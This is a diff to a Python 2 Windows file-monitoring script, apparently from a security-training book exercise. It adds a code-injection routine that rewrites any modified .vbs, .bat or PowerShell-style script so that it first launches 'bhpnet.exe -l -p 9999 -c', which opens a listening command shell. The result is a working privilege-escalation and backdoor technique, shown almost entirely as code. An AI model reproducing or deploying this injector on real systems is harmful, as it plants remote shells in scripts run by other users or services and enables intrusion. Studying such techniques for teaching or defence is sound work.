@@ -12,6 +12,28 @@ FILE_MODIFIED = 3
 FILE_RENAMED_FROM = 4
 FILE_RENAMED_TO = 5
 
+file_types = {}
+command = "C:\\WINDOWS\\TEMP\\bhpnet.exe -l -p 9999 -c"
+file_types['.vbs'] = ["\r\n'bhpmarker\r\n","\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
+file_types['.bat'] = ["\r\nREM bhpmarker\r\n","\r\n%s\r\n" % command]
+file_types['.psl'] = ["\r\n#bhpmarker","Start-Process \"%s\"\r\n" % command]
+
+def inject_code(full_file_name,extension,contents):
+    
+    if file_types[extension][0] in contents:
+        return 
+    
+    full_contents = file_types[extension][0]
+    full_contents += file_types[extension][1]
+    full_contents += contents
+    
+    fd = open(full_file_name,"wb")
+    fd.write(full_contents)
+    fd.close()
+    
+    print "[\o/] Inject code."
+    return 
+
 def start_monitor(path_to_watch):
     
     FILE_LIST_DIRECTORY = 0x0001
@@ -47,6 +69,9 @@ def start_monitor(path_to_watch):
                         print "[^^^] Dump complete."
                     except:
                         print "[!!!] Failed."
+                    filename,extension = os.path.splitext(full_filename)
+                    if extension in file_types:
+                        inject_code(full_filename,extension,contents)
                 elif action == FILE_RENAMED_FROM:
                     print "[ > ] Renamed from: %s" % full_filename
                 elif action == FILE_RENAMED_TO:
